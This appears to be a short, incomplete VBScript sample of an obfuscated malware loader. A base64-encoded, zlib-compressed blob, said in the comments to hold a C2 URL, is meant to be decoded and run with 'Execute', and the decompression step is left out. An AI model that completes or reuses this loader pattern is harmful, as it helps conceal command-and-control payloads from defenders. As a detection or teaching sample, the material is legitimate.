' Nested encoding: Base64 -> Zlib -> VBScript with C2 URL
' The script decompresses a zlib blob hidden in base64

Dim encoded
encoded = "eJw9jrEKwjAYhPc+RcikIKl2FIqI1CpaI01A16Q90BKTYH+hj28Fdbnlvvs4BWLBdjutzyxnmycMQdoODU14pa7VMRNjfGo+Tb6gkBGe8bLQfMb4jSgu07TJBAbziA7Cg1IL0wS/urf5RdYHpdd6L0/zxTjYGtfjr1LwbVIMaF6E0gVr3O+OqNHH4HtoDPQGOno2QQ=="

' In a real attack, this would be decompressed at runtime
' Using a COM object or .NET to decompress zlib
Dim decoded
Set stream = CreateObject("ADODB.Stream")
' ... decompression logic ...
Execute decoded
